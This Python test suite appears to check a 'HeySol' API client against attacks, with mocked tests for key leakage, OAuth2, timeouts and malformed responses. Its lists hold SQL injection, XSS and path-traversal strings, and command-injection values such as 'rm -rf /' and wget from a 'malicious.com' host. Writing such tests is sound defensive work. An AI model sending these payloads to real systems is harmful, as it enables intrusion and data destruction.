#!/usr/bin/env python3
"""
Security and Vulnerability Testing Suite for HeySol API Client

Tests for security vulnerabilities, edge cases, and potential attack vectors.
"""

import os
import json
import time
import pytest
import requests
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, Any
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Import HeySol components
from heysol.client import HeySolClient
from heysol.config import HeySolConfig
from heysol.exceptions import HeySolError, AuthenticationError
from heysol.oauth2 import OAuth2Error


class TestSecurityVulnerabilities:
    """Test suite for security vulnerabilities and edge cases."""

    def setup_method(self):
        """Setup test environment."""
        self.api_key = os.getenv("COREAI_API_KEY", "test-api-key")
        self.config = HeySolConfig(api_key=self.api_key, log_level="WARNING")
        self.client = HeySolClient(config=self.config, use_oauth2=False)

    def test_api_key_leakage_prevention(self):
        """Test that API keys are not leaked in logs or error messages."""
        sensitive_key = "sk-1234567890abcdef1234567890abcdef"

        # Test with sensitive API key
        config = HeySolConfig(api_key=sensitive_key, log_level="INFO")
        client = HeySolClient(config=config, use_oauth2=False)

        # Mock logging to capture output
        with patch('logging.Logger.info') as mock_log:
            # This should not log the full API key
            headers = client._headers()

            # Check that API key is not in plain text in logs
            logged_messages = [call[0][0] for call in mock_log.call_args_list]
            full_key_logged = any(sensitive_key in msg for msg in logged_messages)
            assert not full_key_logged, "API key should not be logged in plain text"

    def test_authorization_header_security(self):
        """Test that authorization headers are properly formatted and secure."""
        test_cases = [
            "valid-api-key-123",
            "sk-1234567890abcdef",
            "Bearer token123",
            "Token abcdef123456"
        ]

        for api_key in test_cases:
            config = HeySolConfig(api_key=api_key)
            client = HeySolClient(config=config, use_oauth2=False)

            headers = client._headers()

            # Should have Authorization header
            assert "Authorization" in headers

            # Should start with Bearer
            assert headers["Authorization"].startswith("Bearer ")

            # Should contain the API key
            assert api_key in headers["Authorization"]

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks through input sanitization."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "'; SELECT * FROM users; --",
            "'; UPDATE users SET password='hacked'; --",
            "'; DELETE FROM users; --",
            "'; INSERT INTO users VALUES ('hacked', 'data'); --",
            "test' OR '1'='1",
            "test' UNION SELECT password FROM users --",
            "test'; EXEC xp_cmdshell('dir'); --",
            "test'; SHUTDOWN; --"
        ]

        for malicious_input in malicious_inputs:
            # Test in space creation
            with patch.object(self.client, '_make_request', return_value=Mock()):
                with patch.object(self.client, '_parse_json_response', return_value={"id": "test"}):
                    # Should not raise exceptions for malicious input
                    try:
                        result = self.client.create_space(malicious_input, "description")
                        assert isinstance(result, str)
                    except Exception as e:
                        # If it fails, it should be due to validation, not SQL injection
                        assert "SQL" not in str(e).upper()
                        assert "DROP" not in str(e).upper()

    def test_xss_prevention(self):
        """Test prevention of XSS attacks through input sanitization."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS')>",
            "'; alert('XSS'); --",
            "\"; alert('XSS'); --"
        ]

        for xss_payload in xss_payloads:
            # Test in message ingestion
            with patch.object(self.client, '_make_request', return_value=Mock()):
                with patch.object(self.client, '_parse_mcp_response', return_value={"id": "test"}):
                    try:
                        result = self.client.ingest(xss_payload, space_id="test-space")
                        assert isinstance(result, dict)
                    except Exception as e:
                        # Should fail due to validation, not XSS execution
                        assert "script" not in str(e).lower()

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "..\\..\\..\\..\\..\\etc\\passwd",
            "/..../..../..../etc/passwd",
            "..././..././..././etc/passwd"
        ]

        for traversal_payload in traversal_payloads:
            # Test in space names and descriptions
            with patch.object(self.client, '_make_request', return_value=Mock()):
                with patch.object(self.client, '_parse_json_response', return_value={"id": "test"}):
                    try:
                        result = self.client.create_space(traversal_payload, "description")
                        assert isinstance(result, str)
                    except Exception as e:
                        # Should fail due to validation, not path traversal
                        assert ".." not in str(e).lower()

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_payloads = [
            "test && whoami",
            "test || id",
            "test; ls -la",
            "test | cat /etc/passwd",
            "test && rm -rf /",
            "test; shutdown now",
            "test || echo 'hacked' > /tmp/hacked",
            "test && curl http://malicious.com",
            "test; wget http://malicious.com/malware"
        ]

        for command_payload in command_payloads:
            # Test in various inputs
            with patch.object(self.client, '_make_request', return_value=Mock()):
                with patch.object(self.client, '_parse_mcp_response', return_value={"id": "test"}):
                    try:
                        result = self.client.ingest(command_payload, space_id="test-space")
                        assert isinstance(result, dict)
                    except Exception as e:
                        # Should fail due to validation, not command execution
                        assert "&&" not in str(e)
                        assert "||" not in str(e)
                        assert ";" not in str(e)

    def test_buffer_overflow_prevention(self):
        """Test prevention of buffer overflow attacks."""
        # Very large inputs that could cause buffer overflows
        large_inputs = [
            "A" * 100000,  # 100KB string
            "🚀" * 50000,  # 50K emojis
            "测试" * 30000,  # 30K Chinese characters
            b"\x00" * 50000,  # 50KB null bytes
            "A" * 1000000,  # 1MB string
        ]

        for large_input in large_inputs:
            # Test with large message
            with patch.object(self.client, '_make_request', return_value=Mock()):
                with patch.object(self.client, '_parse_mcp_response', return_value={"id": "test"}):
                    try:
                        result = self.client.ingest(str(large_input), space_id="test-space")
                        assert isinstance(result, dict)
                    except Exception as e:
                        # Should handle gracefully, not crash
                        assert "overflow" not in str(e).lower()
                        assert "memory" not in str(e).lower()

    def test_authentication_bypass_attempts(self):
        """Test attempts to bypass authentication."""
        bypass_attempts = [
            {"Authorization": ""},  # Empty auth header
            {"Authorization": " "},  # Whitespace auth header
            {"Authorization": "Bearer"},  # Incomplete bearer token
            {"Authorization": "Basic dGVzdDp0ZXN0"},  # Basic auth instead of Bearer
            {"Authorization": "Token abc123"},  # Token instead of Bearer
            {},  # No auth header
            {"authorization": f"Bearer {self.api_key}"},  # Wrong case
        ]

        for headers in bypass_attempts:
            with patch.object(self.client.session, 'request') as mock_request:
                mock_response = Mock()
                mock_response.status_code = 401
                mock_response.text = "Unauthorized"
                mock_request.return_value = mock_response

                try:
                    self.client.get_spaces()
                    # Should fail with authentication error
                    assert False, "Should have raised AuthenticationError"
                except AuthenticationError:
                    # Expected behavior
                    pass
                except Exception as e:
                    # Other errors are also acceptable
                    pass

    def test_oauth2_security_features(self):
        """Test OAuth2 security features."""
        oauth2_config = HeySolConfig(
            oauth2_client_id="test-client-id",
            oauth2_client_secret="test-client-secret",
            log_level="WARNING"
        )
        oauth2_client = HeySolClient(config=oauth2_config, use_oauth2=True)

        # Test PKCE code challenge generation
        if oauth2_client.oauth2_auth:
            code_challenge, code_verifier = oauth2_client.oauth2_auth.generate_pkce_challenge()

            assert isinstance(code_challenge, str)
            assert isinstance(code_verifier, str)
            assert len(code_challenge) == 43  # PKCE challenge length
            assert len(code_verifier) > 40  # PKCE verifier length

    def test_sensitive_data_encryption(self):
        """Test that sensitive data is properly handled."""
        sensitive_data = {
            "api_key": "sk-1234567890abcdef",
            "client_secret": "secret-abcdef123456",
            "access_token": "at_1234567890abcdef",
            "refresh_token": "rt_abcdef1234567890"
        }

        # Test JSON serialization doesn't expose sensitive data
        json_str = json.dumps(sensitive_data)

        # Verify sensitive fields are present but not logged
        parsed = json.loads(json_str)
        assert parsed["api_key"] == sensitive_data["api_key"]
        assert parsed["client_secret"] == sensitive_data["client_secret"]

        # Test that sensitive data is not logged in plain text
        with patch('logging.Logger.info') as mock_log:
            # This should not log sensitive data
            config = HeySolConfig(**sensitive_data)
            client = HeySolClient(config=config, use_oauth2=True)

            # Check logged messages don't contain sensitive data
            logged_messages = [str(call[0]) for call in mock_log.call_args_list]
            sensitive_logged = any(
                sensitive_data[key] in msg
                for key in sensitive_data
                for msg in logged_messages
            )
            assert not sensitive_logged, "Sensitive data should not be logged"

    def test_request_forgery_prevention(self):
        """Test prevention of request forgery attacks."""
        # Test with manipulated request data
        malicious_requests = [
            {"method": "GET", "url": "http://malicious.com/api"},
            {"method": "POST", "url": "https://evil.com/steal"},
            {"method": "DELETE", "url": "http://localhost:8080/delete-all"},
        ]

        for malicious_request in malicious_requests:
            with patch.object(self.client.session, 'request') as mock_request:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {"status": "success"}
                mock_request.return_value = mock_response

                # The client should validate and reject malicious URLs
                try:
                    # This should not make external requests
                    result = self.client._make_request(
                        malicious_request["method"],
                        malicious_request["url"]
                    )
                    # If it succeeds, it should be to the expected domain
                    assert "heysol.ai" in mock_request.call_args[1]["url"]
                except Exception:
                    # Expected to fail for external URLs
                    pass

    def test_dos_prevention(self):
        """Test prevention of Denial of Service attacks."""
        # Test with extremely large request payloads
        huge_payload = {"data": "x" * 10000000}  # 10MB payload

        with patch.object(self.client, '_make_request', return_value=Mock()):
            with patch.object(self.client, '_parse_mcp_response', return_value={"id": "test"}):
                try:
                    # Should handle large payloads gracefully
                    result = self.client.ingest(json.dumps(huge_payload), space_id="test")
                    assert isinstance(result, dict)
                except Exception as e:
                    # Should fail gracefully, not crash
                    assert "memory" not in str(e).lower()
                    assert "overflow" not in str(e).lower()

    def test_timing_attack_prevention(self):
        """Test prevention of timing attacks."""
        # Test that response times don't leak information
        test_cases = [
            "valid-api-key",
            "invalid-api-key",
            "short-key",
            "very-long-api-key-that-should-be-invalid"
        ]

        response_times = []

        for api_key in test_cases:
            start_time = time.time()

            config = HeySolConfig(api_key=api_key)
            client = HeySolClient(config=config, use_oauth2=False)

            with patch.object(client, '_make_request', return_value=Mock()):
                with patch.object(client, '_parse_mcp_response', return_value={"result": "success"}):
                    try:
                        client.get_spaces()
                        end_time = time.time()
                        response_times.append(end_time - start_time)
                    except:
                        end_time = time.time()
                        response_times.append(end_time - start_time)

        # Response times should be relatively consistent (not leak timing info)
        avg_time = sum(response_times) / len(response_times)
        variance = sum((t - avg_time) ** 2 for t in response_times) / len(response_times)

        # Variance should be low (responses should take similar time)
        assert variance < 0.1, "Response times vary too much, may leak timing information"

    def test_cors_handling(self):
        """Test CORS handling and origin validation."""
        # Test that client doesn't make requests to unauthorized origins
        unauthorized_origins = [
            "http://malicious.com",
            "https://evil-site.net",
            "http://localhost:3000",  # Assuming this is not allowed
            "https://phishing-site.com"
        ]

        for origin in unauthorized_origins:
            with patch.object(self.client.session, 'request') as mock_request:
                mock_response = Mock()
                mock_response.status_code = 403
                mock_response.text = "CORS error"
                mock_request.return_value = mock_response

                try:
                    # Should reject unauthorized origins
                    self.client._make_request("GET", f"{origin}/api/test")
                    # If it doesn't raise an error, it should not have made the request
                    assert mock_request.called is False
                except Exception:
                    # Expected behavior
                    pass

    def test_https_enforcement(self):
        """Test that HTTPS is enforced for secure endpoints."""
        http_urls = [
            "http://api.heysol.ai/v1/test",
            "http://heysol.com/api/test",
            "http://core-memory.heysol.ai/test"
        ]

        for http_url in http_urls:
            with patch.object(self.client.session, 'request') as mock_request:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_request.return_value = mock_response

                try:
                    # Should enforce HTTPS
                    self.client._make_request("GET", http_url)
                    # Check that HTTPS was used
                    call_args = mock_request.call_args
                    if call_args:
                        actual_url = call_args[1]["url"]
                        assert actual_url.startswith("https://"), f"HTTP used instead of HTTPS: {actual_url}"
                except Exception:
                    # Expected for HTTP URLs
                    pass


class TestEdgeCases:
    """Test suite for edge cases and unusual scenarios."""

    def setup_method(self):
        """Setup test environment."""
        self.api_key = os.getenv("COREAI_API_KEY", "test-api-key")
        self.config = HeySolConfig(api_key=self.api_key, log_level="WARNING")
        self.client = HeySolClient(config=self.config, use_oauth2=False)

    def test_empty_responses(self):
        """Test handling of empty responses."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {"Content-Type": "application/json"}
        mock_response.json.return_value = {}

        with patch.object(self.client, '_make_request', return_value=mock_response):
            with patch.object(self.client, '_parse_mcp_response', return_value={}):
                result = self.client.get_spaces()
                assert isinstance(result, list)

    def test_malformed_json_responses(self):
        """Test handling of malformed JSON responses."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {"Content-Type": "application/json"}
        mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)

        with patch.object(self.client, '_make_request', return_value=mock_response):
            with pytest.raises(HeySolError, match="Failed to parse JSON response"):
                self.client._parse_json_response(mock_response)

    def test_unicode_in_responses(self):
        """Test handling of Unicode characters in responses."""
        unicode_response = {
            "message": "测试消息 🚀 with émojis and 中文",
            "data": "αβγδε 中文 русский"
        }

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {"Content-Type": "application/json"}
        mock_response.json.return_value = unicode_response

        with patch.object(self.client, '_make_request', return_value=mock_response):
            with patch.object(self.client, '_parse_mcp_response', return_value=unicode_response):
                result = self.client.get_spaces()
                assert isinstance(result, list)

    def test_network_timeout_handling(self):
        """Test handling of network timeouts."""
        with patch.object(self.client.session, 'request', side_effect=requests.exceptions.Timeout):
            with pytest.raises(HeySolError, match="Request timeout"):
                self.client.get_spaces()

    def test_connection_refused_handling(self):
        """Test handling of connection refused errors."""
        with patch.object(self.client.session, 'request', side_effect=requests.exceptions.ConnectionError):
            with pytest.raises(HeySolError, match="Connection error"):
                self.client.get_spaces()

    def test_invalid_ssl_certificate_handling(self):
        """Test handling of invalid SSL certificates."""
        with patch.object(self.client.session, 'request', side_effect=requests.exceptions.SSLError):
            with pytest.raises(HeySolError, match="SSL"):
                self.client.get_spaces()

    def test_empty_headers_handling(self):
        """Test handling of responses with empty headers."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {}
        mock_response.json.return_value = {"status": "success"}

        with patch.object(self.client, '_make_request', return_value=mock_response):
            with patch.object(self.client, '_parse_mcp_response', return_value={"result": "success"}):
                result = self.client.get_spaces()
                assert isinstance(result, list)

    def test_case_sensitivity_handling(self):
        """Test handling of case sensitivity in headers and data."""
        # Test case insensitive header handling
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {
            "content-type": "application/json",  # lowercase
            "Content-Type": "application/json",  # mixed case
            "CONTENT-TYPE": "application/json"   # uppercase
        }
        mock_response.json.return_value = {"status": "success"}

        with patch.object(self.client, '_make_request', return_value=mock_response):
            with patch.object(self.client, '_parse_mcp_response', return_value={"result": "success"}):
                result = self.client.get_spaces()
                assert isinstance(result, list)


if __name__ == "__main__":
    # Run security tests
    print("🔒 Running Security and Vulnerability Tests...")

    try:
        security_suite = TestSecurityVulnerabilities()
        security_suite.setup_method()

        # Test security features
        security_suite.test_api_key_leakage_prevention()
        print("✅ API key leakage prevention test passed")

        security_suite.test_sql_injection_prevention()
        print("✅ SQL injection prevention test passed")

        security_suite.test_xss_prevention()
        print("✅ XSS prevention test passed")

        security_suite.test_buffer_overflow_prevention()
        print("✅ Buffer overflow prevention test passed")

        # Test edge cases
        edge_suite = TestEdgeCases()
        edge_suite.setup_method()

        edge_suite.test_empty_responses()
        print("✅ Empty responses handling test passed")

        edge_suite.test_unicode_in_responses()
        print("✅ Unicode handling test passed")

        edge_suite.test_network_timeout_handling()
        print("✅ Network timeout handling test passed")

        print("\n🎉 All security and edge case tests passed!")

    except Exception as e:
        print(f"❌ Test failed: {e}")
        raise